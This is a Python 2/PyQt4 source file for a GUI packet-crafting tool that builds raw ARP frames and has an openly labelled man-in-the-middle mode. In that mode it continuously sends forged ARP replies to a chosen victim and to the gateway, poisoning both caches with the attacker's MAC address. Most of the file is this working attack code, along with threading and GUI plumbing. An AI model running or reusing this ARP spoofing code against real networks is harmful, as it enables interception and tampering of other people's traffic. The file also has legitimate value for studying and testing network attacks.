
#!/usr/bin/env python

# Packet Crafter: Craft arbitrary packets
# This tool allows you to craft weird packets with any value
#
# You can use this tool to craft weird ARP frames, or even do an arp poisoning attack (MitM)

# Made by Damien Daco

# with PyCharm Community
# Python 2.7 and Qt4

# This is a very early/alpha version

# TODO: infinite ARP loop: should we let user specify frequency? Right now it's hardcoded at 1 second

'''
After several days of searching the web, this is BY FAR the best answer I've ever found.
This guy solved all my multi threading problems:
https://stackoverflow.com/questions/41526832/pyqt5-qthread-signal-not-working-gui-freeze
'''

# Check the very good answer here:
# https://stackoverflow.com/questions/41526832/pyqt5-qthread-signal-not-working-gui-freeze
# Since i added app.processEvents() , the gui is now responsive again,
# but VERY sluggish

# https://stackoverflow.com/questions/23854313/qthread-not-working-and-gui-still-hangs-up
# Copy/paste from that thread:
'''
You're connecting the thread.started signal to a lambda:
thread.started.connect(lambda: process_inst.execCmd())
Using a normal python callable here will always cause the signal to be processed in the gui thread. That's understandable beacause the callable (lambda) doesn't have a thread affinity as QObjects have. From within the lambda the process_inst.execCmd method is then executed synchronously, it doesn't matter what thread affinity the object has. Therefore the GUI thread will block.
If you want the signal to be received and processed within the worker threads event lopp, connect it to the slot directly.
For this to work, you also need to make sure that you keep a reference to process_inst, otherwise it will be destroyed when it goes out of scope.
With these adjustments your program works for me:
thread.started.connect(process_inst.execCmd)
thread.process_inst = process_inst
'''

from PyQt4.QtGui import *
from PyQt4.QtCore import *
import re
from socket import *
import sys
from struct import pack
import get_addresses
import time

# This is my GUI file, design_crafter.py
# Created with Qt Designer, and converted from design_crafter.ui
# with command line tool pyuic4
# Command was:  pyuic4 design_crafter.ui > design_crafter.py
from design_crafter import Ui_MainWindow


class WorkerThread(QObject):

    def __init__(self, frame, packet, continuous, id, interface):

        super(WorkerThread, self).__init__()
        self._is_running = True
        self.frame = frame
        self.packet = packet
        self.continuous = continuous
        self.__id = id
        self.interface = interface
        print "Hi! I'm your friendly worker. My ID is ", self.__id

    def task(self):

        if self.continuous:
            print "Sending infinite ARP packets"
            while self._is_running:
                self.send_eth(self.frame, self.packet)
                QThread.sleep(1)

        if self._is_running and not self.continuous:
            print "Sending a single ARP packet"
            self.send_eth(self.frame, self.packet)

        print "Worker task complete"

    def send_eth(self, frame, packet):
        s = socket(AF_PACKET, SOCK_RAW)
        s.bind((self.interface, 0))
        s.send(frame + packet)

    def stop(self):
        self._is_running = False


class MainWindow(QMainWindow, Ui_MainWindow):

    def __init__(self):
        super(MainWindow, self).__init__()
        self.setupUi(self)

        self.mitm = False
        self.threads = []

        self.interface = get_addresses.get_default_interface()
        self.gateway_ip = get_addresses.get_gateway()
        self.gateway_mac = get_addresses.get_remote_mac(self.gateway_ip)
        self.attacker_mac = get_addresses.get_mac(self.interface)
        self.attacker_mac_bin = self.clean_mac(self.attacker_mac)
        self.attacker_ip = get_addresses.get_host_ip(self.interface)
        self.gateway_mac_box.setDisabled(True)
        self.gateway_ip_box.setDisabled(True)

        self.interface_list = get_addresses.get_interfaces()
        self.interface_box.addItems(self.interface_list)
        self.get_current_interface()
        self.send_arp_button.clicked.connect(self.create_arp_thread)
        self.stop_arp_button.clicked.connect(self.stop_thread)
        self.stop_arp_button.setDisabled(True)
        self.mitm_box.clicked.connect(self.toggle_mitm)
        self.interface_box.currentIndexChanged.connect(self.get_current_interface)

        self.source_mac_box.setText(self.attacker_mac)
        self.source_ip_box.setText(self.attacker_ip)
        self.gateway_ip_box.setText(self.gateway_ip)
        self.gateway_mac_box.setText(self.gateway_mac)

        self.target_ip_box.editingFinished.connect(self.tpa_modified)

    def tpa_modified(self):
        print "Help! I'm being modified"

        self.target_mac = get_addresses.arping(self.interface, str(self.target_ip_box.text()))
        print self.target_mac
        if self.target_mac:
            self.target_mac_box.setText(self.target_mac)


    def get_current_interface(self):
        self.interface = str(self.interface_box.currentText())
        print "Selected interface:", self.interface

    def send_eth(self, frame, packet):
        s = socket(AF_PACKET, SOCK_RAW)
        s.bind((self.interface, 0))
        s.send(frame + packet)

    def create_arp_thread(self):

        self.stop_arp_button.setDisabled(False)
        # # self.__threads = []
        # print "self.threads is", self.threads
        # index = len(self.threads)
        # print "index is", index

        if not self.mitm:
            print "self.threads is", self.threads
            index = len(self.threads)
            print "index is", index
            thread = QThread()
            self.get_arp_values()
            victim_frame = self.arp_frame(self.broadcast_mac, self.source_mac)
            worker = WorkerThread(victim_frame, self.query_packet, self.mitm, index, self.interface)
            self.threads.append((thread, worker))
            worker.moveToThread(thread)
            thread.started.connect(worker.task)
            thread.start()
        else:

            print "self.threads is", self.threads

            self.get_arp_values()
            self.victim_frame = self.arp_frame(self.target_mac, self.gateway_mac)
            self.gateway_frame = self.arp_frame(self.gateway_mac, self.target_mac)

            victim_thread = QThread()
            index = len(self.threads)
            victim_worker = WorkerThread(self.victim_frame, self.victim_packet, self.mitm, index, self.interface)
            self.threads.append((victim_thread, victim_worker))
            victim_worker.moveToThread(victim_thread)
            victim_thread.started.connect(victim_worker.task)
            victim_thread.start()

            gateway_thread = QThread()
            index = len(self.threads)
            gateway_worker = WorkerThread(self.gateway_frame, self.gateway_packet, self.mitm, index, self.interface)
            self.threads.append((gateway_thread, gateway_worker))
            gateway_worker.moveToThread(gateway_thread)
            gateway_thread.started.connect(gateway_worker.task)
            gateway_thread.start()

        # worker = WorkerThread(self.frame, self.packet, self.mitm, index)
        # self.threads.append((thread, worker))
        # worker.moveToThread(thread)
        # thread.started.connect(worker.task)
        # thread.start()

    def stop_thread(self):
        if len(self.threads) > 0:
            print "Sending stop signals to all threads."
            for thread, worker in self.threads:
                worker.stop()
                thread.quit()
                thread.wait()
            self.threads = []
        else:
            print "Can't find any threads."
        self.stop_arp_button.setDisabled(True)

    def toggle_mitm(self):

        if self.mitm_box.isChecked():
            self.mitm = True
            self.gateway_mac_box.setDisabled(False)
            self.gateway_ip_box.setDisabled(False)
            self.source_mac_box.setDisabled(True)
            self.source_ip_box.setDisabled(True)
            self.operation_box.setText("0x0002")

        else:
            self.mitm = False
            self.gateway_mac_box.setDisabled(True)
            self.gateway_ip_box.setDisabled(True)
            self.source_mac_box.setDisabled(False)
            self.source_ip_box.setDisabled(False)
            self.operation_box.setText("0x0001")

    def clean_mac(self, mac):

        cleanmac = re.findall('[a-fA-F0-9]{2}', mac)
        print "testing cleanmac", cleanmac
        hexmac = [int(i, 16) for i in cleanmac]
        print "hexmac is ", hexmac
        binmac = pack('!6B', *hexmac)
        return binmac

    def clean_ip(self, ip):

        cleanip = re.findall('\d{1,3}', ip)
        decimalip = [int(i) for i in cleanip]
        binip = pack('!4B', *decimalip)
        return binip

    def get_arp_values(self):
        # Let's extract the values from each QlineEdit field
        # The values returned from the qlinedit boxes are in format QString! (unicode)
        # We have to get the values, convert them to strings with 'str'
        # Then convert the hexadecimal values (e.g. 0x0800) with int(x, 16)
        # Let's also check if the user has typed a value or not (else, use default 'placeholder' value)

        self.broadcast_mac = pack('!6B', *[0xFF] * 6)

        #begin new code:
        if not self.mitm:

            if self.hardware_type_box.text():
                self.hardware_type = pack('!H', int(str(self.hardware_type_box.text()), 16))
            else:
                self.hardware_type = pack('!H', int(str(self.hardware_type_box.placeholderText()), 16))

            if self.protocol_type_box.text():
                self.protocol_type = pack('!H', int(str(self.protocol_type_box.text()), 16))
            else:
                self.protocol_type = pack('!H', int(str(self.protocol_type_box.placeholderText()), 16))

            if self.hardware_length_box.text():
                self.hardware_length = pack('!B', int(str(self.hardware_length_box.text()), 16))
            else:
                self.hardware_length = pack('!B', int(str(self.hardware_length_box.placeholderText()), 16))

            if self.protocol_length_box.text():
                self.protocol_length = pack('!B', int(str(self.protocol_length_box.text()), 16))
            else:
                self.protocol_length = pack('!B', int(str(self.protocol_length_box.placeholderText()), 16))

            if self.operation_box.text():
                self.operation = pack('!H', int(str(self.operation_box.text()), 16))
            else:
                self.operation = pack('!H', int(str(self.operation_box.placeholderText()), 16))

            if self.source_mac_box.text():
                self.source_mac = self.clean_mac(str(self.source_mac_box.text()))
            else:
                # Careful here, if there's no source MAC, we're in trouble.
                # Let's use 00:00:00:00:00:00
                # It's a bad idea though, the user should always input a MAC address here
                self.source_mac = pack('!6B', *[0x00] * 6)

            if self.source_ip_box.text():
                self.source_ip = self.clean_ip(str(self.source_ip_box.text()))
            else:
                # Same problem as above. User should input sender ip address in source_ip_box box.
                # If no input, let's use ipv4 0.0.0.0
                self.source_ip = pack('!4B', *[0x00] * 4)

            #This part of the code serves to build an ARP query (operation 0x0001), so we MUST use MAC 00:00:00:00:00:00 as a target.
            self.target_mac = pack('!6B', *[0x00] * 6)

            if self.target_ip_box.text():
                self.target_ip = self.clean_ip(str(self.target_ip_box.text()))
            else:
                # Same as above: without user input let's use ipv4 broadcast 255.255.255.255
                self.target_ip = pack('!4B', *[0x00] * 4)

            self.query_packet = self.hardware_type + self.protocol_type + self.hardware_length + self.protocol_length + \
                                self.operation + self.source_mac + self.source_ip + self.target_mac + self.target_ip
            # end of new code

        elif self.mitm:

            if self.hardware_type_box.text():
                self.hardware_type = pack('!H', int(str(self.hardware_type_box.text()), 16))
            else:
                self.hardware_type = pack('!H', int(str(self.hardware_type_box.placeholderText()), 16))

            if self.protocol_type_box.text():
                self.protocol_type = pack('!H', int(str(self.protocol_type_box.text()), 16))
            else:
                self.protocol_type = pack('!H', int(str(self.protocol_type_box.placeholderText()), 16))

            if self.hardware_length_box.text():
                self.hardware_length = pack('!B', int(str(self.hardware_length_box.text()), 16))
            else:
                self.hardware_length = pack('!B', int(str(self.hardware_length_box.placeholderText()), 16))

            if self.protocol_length_box.text():
                self.protocol_length = pack('!B', int(str(self.protocol_length_box.text()), 16))
            else:
                self.protocol_length = pack('!B', int(str(self.protocol_length_box.placeholderText()), 16))

            if self.operation_box.text():
                self.operation = pack('!H', int(str(self.operation_box.text()), 16))
            else:
                self.operation = pack('!H', int(str(self.operation_box.placeholderText()), 16))

            if self.source_mac_box.text():
                self.source_mac = self.clean_mac(str(self.source_mac_box.text()))
            else:
                # Careful here, we can't use the actual value of the placeholder text in this box
                # because the placeholder says "Source address (L2)"
                # Let's use 00:00:00:00:00:00
                # It's a bad idea though, the user should always input a MAC address here
                self.source_mac = pack('!6B', *[0x00] * 6)

            if self.source_ip_box.text():
                self.source_ip = self.clean_ip(str(self.source_ip_box.text()))
            else:
                # Same problem as above. User should input sender ip address in source_ip_box box.
                # If no input, let's use ipv4 0.0.0.0
                self.source_ip = pack('!4B', *[0x00] * 4)

            if self.target_mac_box.text():
                self.target_mac = self.clean_mac(str(self.target_mac_box.text()))
            else:
                # If no user input, use MAC broadcast FF:FF:FF:FF:FF:FF
                self.target_mac = pack('!6B', *[0xFF] * 6)

            if self.target_ip_box.text():
                self.target_ip = self.clean_ip(str(self.target_ip_box.text()))
            else:
                # Same as above: without user input let's use ipv4 broadcast 255.255.255.255
                self.target_ip = pack('!4B', *[0x00] * 4)

            #If MitM mode enabled, let's make sure there's a gateway. Else, popup message:
            if self.mitm and not (self.gateway_ip_box.text() or self.gateway_mac_box.text()):
                self.show_popup("You forgot to specify the gateway.", "Missing gateway", "The gateway is mandatory for MitM attacks", "Specify the IP of your gateway in the Gateway box.")

            if self.mitm and self.gateway_mac_box.text() and self.gateway_ip_box.text():
                self.gateway_mac = self.clean_mac(str(self.gateway_mac_box.text()))
                self.gateway_ip = self.clean_ip(str(self.gateway_ip_box.text()))
                self.gateway_packet = self.hardware_type + self.protocol_type + self.hardware_length + self.protocol_length + self.operation + self.attacker_mac_bin + self.target_ip + self.gateway_mac + self.gateway_ip
                self.victim_packet = self.hardware_type + self.protocol_type + self.hardware_length + self.protocol_length + self.operation + self.attacker_mac_bin + self.gateway_ip + self.target_mac + self.target_ip

        # self.arp_query_code = pack('!H', 0x01)
        #
        # self.query_packet = self.hardware_type + self.protocol_type + self.hardware_length + self.protocol_length + self.arp_query_code + self.source_mac + self.source_ip + self.target_mac + self.target_ip

    def arp_frame(self, dest_mac, source_mac):
        # if (self.operation_box.text() or int(str(self.operation_box.placeholderText()), 16)) == 1:
        #     self.dest_mac = dmac
        #     self.sender_mac = smac
        #     self.proto_arp = pack('!H', 0x806)
        #     self.frame = self.dest_mac + self.sender_mac + self.proto_arp

        # self.dest_mac = dest_mac
        # self.sender_mac = source_mac
        self.proto_arp = pack('!H', 0x806)
        frame = dest_mac + source_mac + self.proto_arp
        return frame

    def show_popup(self, text, title, info, details):

        msg = QMessageBox()
        msg.setIcon(QMessageBox.Critical)
        msg.setText(text)
        msg.setInformativeText(info)
        msg.setWindowTitle(title)
        msg.setDetailedText(details)
        retval = msg.exec_()
        print "value of pressed message box button:", retval

    def exitApp(self):
        self.stop_thread()
        sys.exit(0)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
